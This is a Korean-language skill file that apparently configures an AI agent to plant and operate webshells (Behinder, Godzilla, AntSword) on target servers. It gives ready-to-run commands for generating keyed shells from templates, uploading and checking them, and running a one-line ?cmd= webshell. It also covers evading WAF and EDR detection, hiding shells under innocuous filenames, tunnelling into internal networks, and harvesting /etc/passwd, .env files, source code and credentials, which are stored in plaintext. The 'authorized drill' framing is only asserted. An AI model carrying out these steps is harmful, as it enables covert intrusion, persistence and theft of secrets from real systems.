---
name: webshell-toolkit
description: Behinder / Godzilla / AntSword 의 기동과 사용법. WebShell 업로드와 관리, 접근 유지, 대상 서버 조작에 쓴다
whenToUse: 업로드 지점/파일 쓰기/명령 실행을 이미 확보해 WebShell 을 착지시키고 조작해야 할 때
role: exploit
enabled: true
---

# WebShell 툴킷(준비 완료)

디렉터리 `$DSH_HOME/redteam/toolkit/`, Java 25 가 설치되어 있다.

## 철칙: 착지는 반드시 Behinder 셸 / Godzilla 셸(암호화 셸)

**사용자는 콘솔에서 Behinder/Godzilla 클라이언트로 이 엔트리에 직접 연결해 쓴다**. 따라서:
- **기본적으로는 Behinder 또는 Godzilla 의 암호화 셸만 착지**시키고, `shell_type` + `pass_key` 를 DB 에 기록한다(`redteam_webshell_add`).
- **한 줄 웹셸(`?cmd=`) / 자체 제작 셸 / 메모리 셸은 납품으로 치지 않는다**: 사용자가 연결하지 못하고 대화형 조작이 불가능하다. **임시 중계**로만 쓸 수 있고(예: 진짜 셸 전달이나 터널 구축만을 위해), note 에 "임시 중계, 납품 엔트리 아님"을 반드시 적는다.
- Godzilla GUI 생성은 사람이 있어야 한다; **아래 "GUI 없이 Behinder 셸 생성" 방식을 우선**한다. 명령 한 줄로 납품 가능한 셸이 나온다.

## GUI 없이 Behinder 셸 생성(권장, 스크립트화 가능)

Behinder 셸은 키를 템플릿에 넣는 것뿐이다: 키 = `md5(연결 비밀번호)[:16]`. 저장소에 템플릿이 있다:
`$DSH_HOME/redteam/toolkit/Behinder/server/{shell.jsp,shell.jspx,shell_java9.jsp,shell.php,shell.aspx,shell.ashx,shell.asp}`

```bash
TK=$DSH_HOME/redteam/toolkit
PASS='Rt@2026#xz'                       # 연결 비밀번호(무작위 생성, rebeyond 를 쓰지 않는다)
KEY=$(printf '%s' "$PASS" | md5sum | cut -c1-16)   # Behinder 는 32자리 md5 의 앞 16자리를 요구한다
# JSP: 템플릿의 키를 교체
sed "s/e45e329feb5d925b/$KEY/" $TK/Behinder/server/shell.jsp > /tmp/rt-shell.jsp
# PHP: 동일(템플릿 변수명 $key)
sed "s/e45e329feb5d925b/$KEY/" $TK/Behinder/server/shell.php > /tmp/rt-shell.php
echo "연결 비밀번호 $PASS | 키 $KEY"      # 둘 다 runs/ 와 redteam_webshell_add 에 기록한다
```

- 기본 키 `e45e329feb5d925b` = `md5("rebeyond")[:16]`(템플릿의 주석이 이 뜻이다)——**반드시 자기 비밀번호로 바꾼다**. 기본 비밀번호를 쓰는 것은 셸을 방어자에게 넘기는 것과 같다.
- 대상에 WAF/탐지가 있으면 unicode 이스케이프 변형 `shell_uni.jsp` 를 쓴다: 키도 이스케이프 형식이므로 `\\u00xx` 로 문자별 치환이 필요하다(python 으로 생성할 수 있다).
- 실측 완료: `shell.jsp / shell.jspx / shell_java9.jsp / shell.php / shell.aspx / shell.ashx / shell.asp` 일곱 템플릿 모두 위 `sed` 한 줄로 키를 바꿀 수 있다.

Godzilla 셸(GUI 가 필요할 때):
```bash
DISPLAY=:10.0 java -jar $DSH_HOME/redteam/toolkit/Godzilla/godzilla.jar
# 관리 → 생성: 페이로드 java/jsp, 암호화기 Java_AES_BASE64, 비밀번호와 키 무작위 → 생성 후 업로드
```

## 업로드 후 반드시 "사용자가 연결할 수 있는지" 검증
1. `curl -s -o /dev/null -w '%{http_code}' "https://target/upload/x.jsp"` → 200 이어야 한다(**GET 에 cmd 파라미터로 테스트하지 않는다**. Behinder/Godzilla 셸은 평문 명령에 응답하지 않는다).
2. Behinder 또는 Godzilla GUI 로 새 연결(URL + 연결 비밀번호)을 만들고 "연결 테스트"를 눌러 통과해야 성공이다; 통과하면 가상 터미널로 `id/whoami` 를 실행한다.
3. DB 기록은 빠짐없이: `url`, `shell_type=behinder|godzilla`, `pass_key=연결 비밀번호`, `privilege`, `secret_ref`(증거 파일); 이어서 **즉시 suo5 터널을 만든다**(스킬 `suo5-tunnel`).

## 도구 일람

| 도구 | 기동 명령 | 설명 |
|---|---|---|
| Behinder v4.1 | `java -jar $DSH_HOME/redteam/toolkit/Behinder/Behinder.jar` | AES 암호화 트래픽, JSP/PHP/ASPX |
| Godzilla v4.0.1 | `java -jar $DSH_HOME/redteam/toolkit/Godzilla/godzilla.jar` | JSP/PHP/ASPX 전체 암호화 payload 지원 |
| AntSword | `$DSH_HOME/redteam/toolkit/AntSword/AntSword-Loader-v4.0.3-linux-x64/AntSword` | 첫 기동 시 소스 디렉터리 `antSword-2.1.16` 선택 |
| suo5 터널 | `./suo5-linux-amd64` | 스킬 `suo5-tunnel` 참조 |

## 전형적 흐름(승인된 드릴)
1. **쓰기 지점 확정**: 업로드 취약점 / 임의 파일 쓰기 / 관리자 플러그인 업로드 / 템플릿 쓰기 / 데이터베이스 파일 쓰기(`INTO OUTFILE`).
2. **payload 생성**: 대상 언어에 따라 JSP/JSPX/PHP/ASPX 선택(위 "GUI 없이 Behinder 셸 생성" 참조), 비밀번호는 무작위 생성 후 `runs/` 에 기록.
3. **업로드와 접근**: `curl -s "https://target.example.com/upload/x.jsp"` 로 200 응답 확인; 셸을 눈에 띄는 경로(예: `/shell.jsp`)에 두지 않고 정적 리소스와 같은 스타일의 무작위 파일명을 쓴다.
4. **연결 관리**: 도구에 URL + 비밀번호를 추가하고 연결을 테스트한다; 성공하면 "가상 터미널"로 명령을 실행한다.
5. **유지와 활용**:
   - `id/whoami/hostname/uname -a`, 시스템 계정, 내부 IP, 라우팅을 수집한다.
   - **즉시 suo5 로 터널을 열어 내부망으로 진입**(스킬 `suo5-tunnel`, 내부망 돌파의 표준 통로다).
   - 민감 파일 수집: `/etc/passwd`, 설정, `.env`, 소스, 데이터베이스 연결 문자열 → `runs/` 에 저장.
6. **DB 기록**:
   - `redteam_webshell_add`(url / **shell_type** / **pass_key** / privilege / secret_ref)
   - `redteam_access_add`(host/계정/방식 webshell/권한/세션 참조)
   - `redteam_vuln_update` 로 진입 취약점을 `exploited` 로 설정
   - `redteam_http_evidence_add` 로 업로드 요청과 셸 접근 요청 저장
   - `redteam_chain_add`(stage=exploit/access)

## 명령 실행(임시 중계일 때만 사용)
한 번짜리 명령 실행만 필요하면 이미 있는 RCE 나 터널을 직접 쓰는 편이 낫다. 한 줄 웹셸을 착지시킬 필요는 없다:
```bash
# 예: 임시 한 줄 웹셸로 파라미터 전달 실행(사용 후 삭제, 납품 엔트리 아님)
curl -s "https://target.example.com/upload/x.jsp?cmd=id"
# Behinder/Godzilla 는 GUI 도구이므로, 명령행에서는 suo5 터널 + 일반 도구가 더 간편하다
```

## 주의 사항
- 생성한 셸은 **이번 승인 드릴의 대상**에만 업로드한다; 사용 후 필요에 따라 정리한다(파일 삭제, 원상 복구).
- 도구 GUI 는 그래픽 세션이 필요하다(`DISPLAY=:10.0` 사용 가능).
- 자격 증명은 `redteam_credential_add` 로 DB 에 기록한다: **평문을 `secret_value` 에 기록**(패널에 그대로 표시되어 재사용하기 좋다), 동시에 증거 파일을 `runs/` 에 쓰고 `secret_ref` 에 참조한다. 자산 DB 는 로컬에만 있으며, DB 나 내보낸 내용을 밖으로 가져가지 않는다.
- 대상에 EDR/탐지가 있을 수 있다: 먼저 셸이 살아 있는지 테스트해 반복 착지로 경보를 유발하지 않는다; 착지가 실패하면 언어/인코딩(JSP→JSPX→PHP)을 바꾸거나 업로드 지점을 바꾼다.
